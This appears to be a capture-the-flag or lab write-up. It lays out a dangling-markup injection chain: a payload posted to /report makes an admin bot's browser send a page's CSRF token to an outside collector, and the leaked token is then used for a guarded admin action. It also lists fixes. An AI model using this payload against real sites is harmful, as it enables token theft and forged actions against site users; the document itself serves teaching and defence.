Full chain — no JavaScript anywhere.

1. Queue the dangling-markup injection (URL-encode the whole `u` value):

```
POST /report
Content-Type: application/json

{"url":"/page?u=x><img src='http://collector:9000/leak?d="}
```

The admin bot renders `/page` with its session; the dangling `<img src='…d=` swallows
the source line — including `value=<token>` — up to the next quote, and the browser
sends it to the collector.

2. Read what was captured and pull the token out:

```
GET /oob/received
# item path like /leak?d=…<input type=hidden name=csrf value=<16 hex>…
```

3. Use the leaked token to perform the guarded action, then solve:

```
POST /admin/action   Content-Type: application/json   {"csrf":"<16 hex>"}   → 200
POST /solve                                                                  → FLAG{…}
```

`tests/exploit.py` runs the whole flow and first proves the mechanism: `/page` is
403 for you, a _terminated_ `<img>` (src closed before the token) leaks **no** token,
and `/admin/action` rejects a wrong token — so only the dangling capture of the real
token completes the chain. Fixes: quote + encode the reflected attribute, and keep
the CSRF token off a page that echoes your input.
